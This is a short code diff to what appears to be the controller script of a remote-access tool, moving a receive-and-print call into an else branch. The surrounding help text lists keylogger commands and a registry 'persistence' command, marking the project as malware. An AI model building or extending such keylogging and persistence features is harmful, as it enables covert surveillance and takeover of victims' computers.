@@ -42,7 +42,8 @@ def target_communication():
             keylloger -p ~ print inputed keys
             keylogger -stop ~ stop keylogger
             persistence *RegName* *FileName* ~ create register in registry''')
-        result = reliable_rcv()
-        print(result)
+        else:
+            result = reliable_rcv()
+            print(result)
     
 target_communication()
